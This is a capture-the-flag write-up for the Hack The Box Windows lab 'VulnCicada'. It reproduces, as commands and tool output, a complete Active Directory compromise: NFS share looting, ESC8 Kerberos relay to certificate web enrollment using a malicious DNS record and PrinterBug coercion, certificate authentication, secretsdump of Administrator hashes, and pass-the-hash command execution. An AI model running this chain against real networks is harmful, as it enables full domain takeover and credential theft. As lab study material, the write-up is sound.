---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Certipy
  - Pass-The-Certificate
  - Secrets-Dump
  - ESC-8
  - LDAP
---
# Overview

| Name        | VulnCicada  |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- -T4 --min-rate 10000 10.129.234.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 02:52 CDT
Nmap scan report for 10.129.234.48
Host is up (0.16s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 07:52:52Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-15T07:40:38
|_Not valid after:  2026-10-15T07:40:38
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-15T07:40:38
|_Not valid after:  2026-10-15T07:40:38
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-15T07:40:38
|_Not valid after:  2026-10-15T07:40:38
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-15T07:40:38
|_Not valid after:  2026-10-15T07:40:38
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-15T07:54:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2025-10-14T07:47:48
|_Not valid after:  2026-04-15T07:47:48
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52026/tcp open  msrpc         Microsoft Windows RPC
52041/tcp open  msrpc         Microsoft Windows RPC
52108/tcp open  msrpc         Microsoft Windows RPC
52119/tcp open  msrpc         Microsoft Windows RPC
52791/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-15T07:53:43
|_  start_date: N/A
```

Website is a IIS page when we do directory busting we get nothing.

```bash
$ nxc smb 10.129.234.48 --generate-hosts-file hosts
[*] Initializing SMB protocol database
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
$ cat hosts 
10.129.234.48     DC-JPQ225.cicada.vl cicada.vl DC-JPQ225
```

```bash
$ sudo tee -a /etc/hosts < hosts
10.129.234.48     DC-JPQ225.cicada.vl cicada.vl DC-JPQ225
```

Anonymous login doesn't work.

```bash
$ showmount -e 10.129.234.48
Export list for 10.129.234.48:
/profiles (everyone)
$ sudo mount -t nfs -o rw 10.129.234.48:/profiles /mnt
$ ls /mnt
Administrator    Jane.Carter     Katie.Ward       Rosie.Powell
Daniel.Marshall  Jordan.Francis  Megan.Simpson    Shirley.West
Debra.Wright     Joyce.Andrews   Richard.Gibbons
```

```bash
$ ls -la
total 14
drwxrwxrwx  2 nobody nogroup 4096 Jun  3 05:21 .
drwxr-xr-x 19 root   root    4096 Oct 15 00:51 ..
drwxrwxrwx  2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx  2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx  2 nobody nogroup   64 Sep 13  2024 Shirley.West
```

```bash
$ sudo cp /mnt/Rosie.Powell/marketing.png .
$ sudo cp /mnt/Administrator/vacation.png .
```

```bash
# Change ownership to your user
sudo chown ninjathebox98w1:ninjathebox98w1 marketing.png

# Make it readable by your user
chmod +r marketing.png

# Or set proper permissions (readable by owner, and optionally others)
chmod 644 marketing.png
```

![[vulncicada.png]]

We see password `Cicada123`. Login with Kerberos SMB.

```bash
$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
```

```bash
$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share 
```

```bash
$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --generate-tgt Rosie
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] TGT saved to: Rosie.ccache
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Run the following command to use the TGT: export KRB5CCNAME=Rosie.ccache

$ KRB5CCNAME=Rosie.ccache smbclient.py -k DC-JPQ225.cicada.vl
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# 
```

```bash
# shares
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL
# use CertEnroll
# ls
drw-rw-rw-          0  Wed Oct 15 02:53:57 2025 .
drw-rw-rw-          0  Fri Sep 13 10:17:59 2024 ..
-rw-rw-rw-        741  Wed Oct 15 02:50:05 2025 cicada-DC-JPQ225-CA(1)+.crl
-rw-rw-rw-        941  Wed Oct 15 02:50:05 2025 cicada-DC-JPQ225-CA(1).crl
-rw-rw-rw-        742  Wed Oct 15 02:49:55 2025 cicada-DC-JPQ225-CA(10)+.crl
<SNIP>
```

This is public keys nothing important.
# Enumeration, Initial Foothold  & Privilege Escalation

Since there are certificates related things.
## Certipy

Fuck manually install certipy.

```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```

```bash
$ certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 2E038686FF3A93954DEAFD175CD2B230
    Certificate Validity Start          : 2025-10-15 07:43:47+00:00
    Certificate Validity End            : 2525-10-15 07:53:47+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

There are no vulnerable certificates but the Certification Authority is vulnerable to ESC8 since HTTP web enrollement is enabled. The web server on port 80 has just the default IIS page, but if we check `/certsrv/` we note that this is the endpoint for the ADCS web enrollment. **ESC8**! Time for some **Kerberos relay exploitation**, inspired by this [research](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx). Check if **machine account quota** allows us to add a new machine to the domain.

```bash
$ nxc ldap cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq
LDAP        cicada.vl       389    DC-JPQ225.cicada.vl [*]  x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)
LDAP        cicada.vl       389    DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123
MAQ         cicada.vl       389    DC-JPQ225.cicada.vl [*] Getting the MachineAccountQuota
MAQ         cicada.vl       389    DC-JPQ225.cicada.vl MachineAccountQuota: 10
```

The **MachineAccountQuota** is set to **10**, which means we can create or join a computer to the domain!
##### Add a malicious DNS record with Your IP

```bash
$ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.122
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

Verify:

```bash
$ nslookup DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl 10.129.98.252
Server:		10.129.98.252
Address:	10.129.98.252#53

Name:	DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl
Address: 10.10.14.122
```
#### Start Certipy Relay

```bash
$ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
```

```bash
$ nxc smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus                                                                     SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
```

Any Attack should work But PrinterBug is most reliable.

```bash
$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PrinterBug
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```

```bash
$ certipy relay -target 'http://10.129.98.252/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)

/home/at0m/Hentai/venv/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/__init__.py:20: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] Targeting http://10.129.98.252/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] SMBD-Thread-2 (process_request_thread): Received connection from 10.129.98.252, attacking target http://10.129.98.252
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] HTTP Request: GET http://10.129.98.252/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://10.129.98.252/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://10.129.98.252/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://10.129.98.252 as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] SMBD-Thread-4 (process_request_thread): Received connection from 10.129.98.252, attacking target http://10.129.98.252
[*] HTTP Request: GET http://10.129.98.252/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://10.129.98.252/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: POST http://10.129.98.252/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 92
[*] Retrieving certificate for request ID: 92
[*] HTTP Request: GET http://10.129.98.252/certsrv/certnew.cer?ReqID=92 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...
```

Authenticate with certificate.

```bash
$ certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.98.252
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```
## SecretsDump

```bash
$ KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
/home/at0m/Hentai/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up...
```

```bash
$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
```

```bash
$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k -x "type C:\\users\\administrator\\desktop\\user.txt"
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] Executed command via wmiexec
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        90bd3e9976e45b0305167fbac02e502d
```

```bash
$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k -x "type C:\\users\\administrator\\desktop\\root.txt"
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] Executed command via wmiexec
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        c9315adba0d1c4a432fd9c23d38867e3
```

---




